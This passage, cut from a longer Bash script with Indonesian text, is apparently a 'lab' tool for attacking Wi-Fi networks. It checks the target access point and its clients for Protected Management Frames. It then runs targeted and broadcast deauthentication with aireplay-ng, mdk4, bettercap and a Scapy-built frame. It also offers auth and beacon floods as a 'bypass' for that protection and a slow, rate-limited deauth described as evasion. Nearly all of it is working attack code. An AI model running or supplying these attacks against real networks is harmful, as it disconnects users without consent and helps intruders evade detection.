                        notifikasi_sukses "Client target diatur ke: $SELECTED_CLIENT"
                    else
                        SELECTED_CLIENT=""
                        notifikasi_gagal "Pilihan tidak valid, menggunakan default: $CLIENT"
                    fi
                    ;;
            esac
        else
            SELECTED_CLIENT=""
            echo -e "${YELLOW}[i] Tidak ada klien dalam daftar, menggunakan default: $CLIENT${NC}"
        fi
        echo ""

        # Pastikan target HP (CLIENT) selalu ada dalam clients.txt
        local client_upper
        client_upper=$(echo "$CLIENT" | tr '[:lower:]' '[:upper:]')
        local already=0
        if [ -f "$CLIENT_LIST_FILE" ]; then
            while IFS= read -r existing_mac; do
                if [ "$(echo "$existing_mac" | tr '[:lower:]' '[:upper:]')" = "$client_upper" ]; then
                    already=1
                    break
                fi
            done < "$CLIENT_LIST_FILE"
        fi
        if [ "$already" -eq 0 ]; then
            echo "$client_upper" >> "$CLIENT_LIST_FILE"
            echo -e "${YELLOW}[i] Target HP $CLIENT ditambahkan ke $CLIENT_LIST_FILE${NC}"
        fi
        echo ""
    fi

    # ============================================================
    # Bagian D: Deteksi MFP untuk Setiap Klien dari Daftar
    # ============================================================
    echo -e "${BLUE}[D] Memeriksa MFP (PMF) untuk setiap klien yang terdeteksi...${NC}"
    echo ""
    echo "MAC Address                     MFPC(6) MFPR(7) Status"
    echo "--------------------------------  ------- ------- ------"

    local found_any_client_mfp=0

    if [ -f "$CLIENT_LIST_FILE" ] && [ -s "$CLIENT_LIST_FILE" ]; then
        while IFS= read -r client_mac; do
            [ -z "$client_mac" ] && continue

            local tmp_client_mfp="/tmp/mfp_client_${client_mac//:/_}_$$"
            sudo tshark -i "$IFACE" -Y "wlan.fc.type_subtype == 0x00 && wlan.sa == $client_mac && wlan.bssid == $BSSID" \
                -T fields -e wlan.sa -e wlan.rsn.capabilities.mfpc -e wlan.rsn.capabilities.mfpr \
                -c 3 2>/dev/null > "$tmp_client_mfp" || true

            local client_status="Tidak terdeteksi"
            local client_has_mfp=0

            while IFS=$'\t' read -r sa_hex mfpc mfpr; do
                [ -z "$sa_hex" ] && continue

                if [ -n "$mfpr" ] && [ "$mfpr" = "1" ]; then
                    client_status="MFP WAJIB"
                    client_has_mfp=1
                    found_any_client_mfp=1
                elif [ -n "$mfpc" ] && [ "$mfpc" = "1" ]; then
                    client_status="MFP Opsional"
                    client_has_mfp=1
                    found_any_client_mfp=1
                else
                    client_status="Tanpa MFP"
                fi
            done < "$tmp_client_mfp"
            rm -f "$tmp_client_mfp"

            local mark=""
            if [ "$(echo "$client_mac" | tr '[:lower:]' '[:upper:]')" = "$(echo "$CLIENT" | tr '[:lower:]' '[:upper:]')" ]; then
                mark="  <-- Target HP"
            fi

            printf "%-25s %-7s %-7s %s%s\n" "$client_mac" "--" "--" "$client_status" "$mark"

        done < "$CLIENT_LIST_FILE"
    else
        echo "  (Tidak ada klien dalam daftar)"
    fi

    echo ""

    # ============================================================
    # Kesimpulan
    # ============================================================
    echo -e "${BLUE}[Ringkasan Deteksi MFP]${NC}"
    if [ "$found_ap_mfp" -eq 1 ]; then
        echo -e "  Router/AP  : ${GREEN}MFP terdeteksi${NC}"
    else
        echo -e "  Router/AP  : ${YELLOW}Tidak ada tanda MFP${NC}"
    fi

    if [ "$found_any_client_mfp" -eq 1 ]; then
        echo -e "  Klien      : ${GREEN}Ada klien yang mendukung MFP${NC}"
    else
        echo -e "  Klien      : ${YELLOW}Tidak ada klien yang mendukung MFP${NC}"
    fi

    if [ "$found_ap_mfp" -eq 1 ] && [ "$found_any_client_mfp" -eq 1 ]; then
        echo -e "${RED}[!] Router dan klien mendukung MFP — deauth bisa diblokir oleh PMF.${NC}"
        echo -e "${RED}[!] Pertimbangkan menggunakan MFP Bypass (Langkah 6).${NC}"
    elif [ "$found_ap_mfp" -eq 1 ]; then
        echo -e "${YELLOW}[!] Hanya router yang mendukung MFP.${NC}"
    elif [ "$found_any_client_mfp" -eq 1 ]; then
        echo -e "${YELLOW}[!] Hanya klien yang mendukung MFP.${NC}"
    else
        echo -e "${GREEN}[+] Tidak ada MFP terdeteksi pada router maupun klien.${NC}"
    fi
    echo -e "${GREEN}[+] Deteksi MFP selesai.${NC}"
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 2: DEAUTH TUNGGAL (Targeted)
# ---------------------------------------------------------------
langkah_deauth_tunggal() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 2: DEAUTH TUNGGAL (Targeted)${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Mengirim 10 paket deauth ke client $CLIENT dari AP $BSSID."

    if [ -n "$DETECTED_CHANNEL" ]; then
        set_channel "$DETECTED_CHANNEL"
    fi

    TARGET_CLIENT="${SELECTED_CLIENT:-$CLIENT}"
    sudo aireplay-ng -0 10 -a "$BSSID" -c "$TARGET_CLIENT" "$IFACE"
    if [ $? -eq 0 ]; then
        notifikasi_sukses "Deauth tunggal ke $TARGET_CLIENT selesai"
    else
        notifikasi_gagal "Deauth tunggal ke $TARGET_CLIENT gagal"
    fi
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 3: DEAUTH BROADCAST (Semua Client)
# ---------------------------------------------------------------
langkah_deauth_broadcast() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 3: DEAUTH BROADCAST (Semua Client)${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo -e "${YELLOW}[!] PERINGATAN: Ini akan memutus SEMUA klien yang terhubung ke AP $BSSID.${NC}"
    echo ""

    if [ -n "$DETECTED_CHANNEL" ]; then
        set_channel "$DETECTED_CHANNEL"
    fi

    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
    echo -e "${YELLOW}    Tekan Ctrl+C untuk menghentikan lebih awal.${NC}"
    echo ""
    read -p "Lanjutkan? (y/N): " konfirm
    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
        timeout 30 sudo aireplay-ng -0 0 -a "$BSSID" "$IFACE" || true
    else
        echo -e "${YELLOW}[-] Dilewati.${NC}"
    fi
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 4: MDK4 DEAUTH
# ---------------------------------------------------------------
langkah_mdk4() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 4: MDK4 DEAUTH${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Menulis target BSSID ke file target.txt..."
    echo "$BSSID" > target.txt

    if [ -n "$DETECTED_CHANNEL" ]; then
        set_channel "$DETECTED_CHANNEL"
    fi

    echo "Menjalankan mdk4 deauth + disassociation."
    if [ -n "$DETECTED_CHANNEL" ]; then
        echo "Channel: $DETECTED_CHANNEL"
    else
        echo -e "${YELLOW}[!] Channel tidak diketahui, mdk4 akan menggunakan default.${NC}"
    fi

    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
    echo -e "${YELLOW}    Tekan Ctrl+C untuk menghentikan lebih awal.${NC}"
    echo ""
    read -p "Lanjutkan? (y/N): " konfirm
    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
        if [ -n "$DETECTED_CHANNEL" ]; then
            timeout 30 sudo mdk4 "$IFACE" d -b target.txt -c "$DETECTED_CHANNEL" || true
        else
            timeout 30 sudo mdk4 "$IFACE" d -b target.txt || true
        fi
    else
        echo -e "${YELLOW}[-] Dilewati.${NC}"
    fi
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 5: BETTERCAP DEAUTH
# ---------------------------------------------------------------
langkah_bettercap() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 5: BETTERCAP DEAUTH${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Menjalankan bettercap secara non-interaktif (recon + deauth ke $BSSID)."
    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
    echo ""
    read -p "Lanjutkan? (y/N): " konfirm
    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
        timeout 30 sudo bettercap -iface "$IFACE" -eval "wifi.recon on; wifi.deauth $BSSID" || true
    else
        echo -e "${YELLOW}[-] Dilewati.${NC}"
    fi
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 6: MFP BYPASS
# ---------------------------------------------------------------
langkah_mfp_bypass() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 6: MFP BYPASS${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Metode bypass MFP yang digunakan:"
    echo "  - Auth Flood    : kehabisan slot asosiasi pada AP"
    echo "  - Beacon Flood  : buat klien bingung memilih jaringan"
    echo ""

    if [ -n "$DETECTED_CHANNEL" ]; then
        set_channel "$DETECTED_CHANNEL"
    fi

    echo -e "${YELLOW}[!] mdk4 akan berjalan selama 30 detik per perintah.${NC}"
    echo -e "${YELLOW}    Tekan Ctrl+C untuk menghentikan lebih awal.${NC}"
    read -p "Jalankan Auth Flood? (y/N): " konfirm1
    if [[ "$konfirm1" =~ ^[Yy]$ ]]; then
        if [ -n "$DETECTED_CHANNEL" ]; then
            timeout 30 sudo mdk4 "$IFACE" a -a "$BSSID" || true
        else
            timeout 30 sudo mdk4 "$IFACE" a -a "$BSSID" || true
        fi
    fi
    read -p "Jalankan Beacon Flood? (y/N): " konfirm2
    if [[ "$konfirm2" =~ ^[Yy]$ ]]; then
        if [ -f "ssid-list.txt" ]; then
            if [ -n "$DETECTED_CHANNEL" ]; then
                timeout 30 sudo mdk4 "$IFACE" b -f ssid-list.txt -c "$DETECTED_CHANNEL" || true
            else
                timeout 30 sudo mdk4 "$IFACE" b -f ssid-list.txt || true
            fi
            if [ $? -eq 0 ]; then
                notifikasi_sukses "Beacon Flood selesai"
            else
                notifikasi_gagal "Beacon Flood gagal"
            fi
        else
            echo -e "${YELLOW}[i] File ssid-list.txt tidak ditemukan.${NC}"
            echo -e "${YELLOW}[i] Buat file ssid-list.txt dengan daftar SSID (satu SSID per baris) untuk Beacon Flood.${NC}"
            echo -e "${YELLOW}[i] Contoh: echo \"NAMA_WIFI\" > ssid-list.txt${NC}"
            notifikasi_gagal "Beacon Flood dilewati (ssid-list.txt tidak ada)"
        fi
    fi

    if [ -n "$SELECTED_CLIENT" ]; then
        notifikasi_sukses "MFP bypass selesai (target: $SELECTED_CLIENT)"
    else
        notifikasi_sukses "MFP bypass selesai (target default: $CLIENT)"
    fi
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 7: EVASION SLOW (Rate-Limited)
# ---------------------------------------------------------------
langkah_evasion_slow() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 7: EVASION SLOW (Rate-Limited)${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Mengirim deauth 1 paket setiap 30 detik (5 kali), lalu 2 paket tambahan."

    if [ -n "$DETECTED_CHANNEL" ]; then
        set_channel "$DETECTED_CHANNEL"
    fi

    TARGET_CLIENT="${SELECTED_CLIENT:-$CLIENT}"
    for i in $(seq 1 5); do
        echo -e "${YELLOW}  Burst $i/5${NC}"
        sudo aireplay-ng -0 1 -a "$BSSID" -c "$TARGET_CLIENT" "$IFACE"
        if [ "$i" -lt 5 ]; then
            sleep 30
        fi
    done
    echo ""
    echo "Deauth tambahan (2 paket) untuk client bernilai tinggi..."
    sudo aireplay-ng -0 2 -a "$BSSID" -c "$TARGET_CLIENT" "$IFACE"
    echo ""

    echo "mdk4 disassociation rendah intensitas (1 paket/detik)..."
    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
    read -p "Lanjutkan mdk4? (y/N): " konfirm
    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
        if [ -n "$DETECTED_CHANNEL" ]; then
            timeout 30 sudo mdk4 "$IFACE" d -b target.txt -s 1 || true
        else
            timeout 30 sudo mdk4 "$IFACE" d -b target.txt -s 1 || true
        fi
    fi
    echo -e "${GREEN}[+] Evasion slow selesai.${NC}"
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 8: SCAPY DEAUTH (Custom Reason Code)
# ---------------------------------------------------------------
langkah_scapy() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 8: SCAPY DEAUTH (Custom Reason Code)${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Membuat dan mengirim paket deauth custom (reason code 3 = client leaving)."

    if [ -n "$DETECTED_CHANNEL" ]; then
        set_channel "$DETECTED_CHANNEL"
    fi

    TARGET_CLIENT="${SELECTED_CLIENT:-$CLIENT}"
    export BSSID CLIENT IFACE SELECTED_CLIENT TARGET_CLIENT

    python3 << 'EOF'
from scapy.all import *

import os
ap_mac = os.environ.get("BSSID", "14:8C:4A:B4:F4:8C")
client_mac = os.environ.get("TARGET_CLIENT", os.environ.get("CLIENT", "20:3B:69:CE:88:3D"))
iface = os.environ.get("IFACE", "wlan0mon")

pkt = RadioTap() / Dot11(
    addr1=client_mac,
    addr2=ap_mac,
    addr3=ap_mac
) / Dot11Deauth(reason=3)

sendp(pkt, iface=iface, count=3, inter=0.5)
EOF

    if [ $? -eq 0 ]; then
        notifikasi_sukses "Scapy deauth ke $TARGET_CLIENT selesai"
    else
        notifikasi_gagal "Scapy deauth ke $TARGET_CLIENT gagal"
    fi
    echo ""
}

# ---------------------------------------------------------------
# TAMPILAN MENU
# ---------------------------------------------------------------
tampilkan_menu() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}   MFP WiFi Lab - Master Script${NC}"
    echo -e "${BLUE}========================================${NC}"
    if [ -n "$BSSID" ]; then
        echo "BSSID Router : $BSSID"
        if [ -n "$AP_SSID" ]; then
            echo "SSID Router  : $AP_SSID"
        fi
    else
        echo -e "BSSID Router : ${YELLOW}(belum dipilih — pakai menu a)${NC}"
    fi
    if [ -n "$SELECTED_CLIENT" ]; then
        echo "Client Target: $SELECTED_CLIENT (dipilih)"
    else
        echo "Client HP    : $CLIENT (default)"
    fi
    echo "Interface    : $IFACE"
    if [ -n "$DETECTED_CHANNEL" ]; then
        echo "Channel      : $DETECTED_CHANNEL"
    else
        echo "Channel      : (belum diset)"
    fi
    echo ""
    echo "Pilih langkah:"
    echo "  0. Persiapan & Cek (root, interface, tools, channel)"
    echo "  a. Scan & pilih Router AP"
    echo "  1. Deteksi MFP + Scan Klien Otomatis"
    echo "  2. Deauth Tunggal (Targeted)"
    echo "  3. Deauth Broadcast (Semua Client)"
    echo "  4. MDK4 Deauth"
    echo "  5. Bettercap Deauth"
    echo "  6. MFP Bypass"
    echo "  7. Evasion Slow (Rate-Limited)"
    echo "  8. Scapy Deauth (Custom Reason Code)"
    echo "  9. Jalankan Semua (Urut)"
    echo "  t. Ubah Target Client"
    echo "  r. Pulihkan Wi-Fi (matikan monitor mode)"
    echo "  q. Keluar"
    echo ""
    read -p "Pilihan: " pilihan
}

# ---------------------------------------------------------------
# JALANKAN SEMUA (URUT) - dengan timeout otomatis
# ---------------------------------------------------------------
jalankan_semua() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}   Menjalankan Semua Langkah (Urut)${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""

    export BSSID CLIENT IFACE SELECTED_CLIENT

    langkah_persiapan
    langkah_deteksi_mfp
    langkah_deauth_tunggal

    echo -e "${YELLOW}[!] Langkah 3 (Broadcast Deauth) - 30 detik${NC}"
    langkah_deauth_broadcast

    echo -e "${YELLOW}[!] Langkah 4 (MDK4 Deauth) - 30 detik${NC}"
    langkah_mdk4

    echo -e "${YELLOW}[!] Langkah 5 (Bettercap Deauth) - 30 detik${NC}"
    langkah_bettercap

    langkah_mfp_bypass
    langkah_evasion_slow
    langkah_scapy

    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}   Semua langkah telah diproses.${NC}"
    echo -e "${GREEN}========================================${NC}"
}

# ---------------------------------------------------------------
# MAIN LOOP
# ---------------------------------------------------------------
# Mode non-interaktif: sudo ./jalankan-semua.sh --restore-wifi
if [ "${1:-}" = "--restore-wifi" ] || [ "${1:-}" = "restore-wifi" ]; then
    pulihkan_wifi
    exit $?
fi

while true; do
    tampilkan_menu
    case $pilihan in
        0|1|2|3|4|5|6|7|8|9|t|T)
            if ! pastikan_target; then
                echo -e "${RED}[!] Target AP belum dipilih. Gunakan menu a untuk scan.${NC}"
                echo ""
                read -p "Tekan Enter untuk kembali ke menu..."
                continue
            fi
            ;;
    esac
    case $pilihan in
        0) langkah_persiapan ;;
        a|A) pilih_router_ap ;;
        1) langkah_deteksi_mfp ;;
        2) langkah_deauth_tunggal ;;
        3) langkah_deauth_broadcast ;;
        4) langkah_mdk4 ;;
        5) langkah_bettercap ;;
        6) langkah_mfp_bypass ;;
        7) langkah_evasion_slow ;;
        8) langkah_scapy ;;
        9) jalankan_semua ;;
        t|T) langkah_deteksi_mfp ;;
        r|R) pulihkan_wifi ;;
        q|Q) echo "Keluar."; break ;;
        *) echo -e "${RED}Pilihan tidak valid.${NC}" ;;
    esac
    echo ""
    read -p "Tekan Enter untuk kembali ke menu..."
done
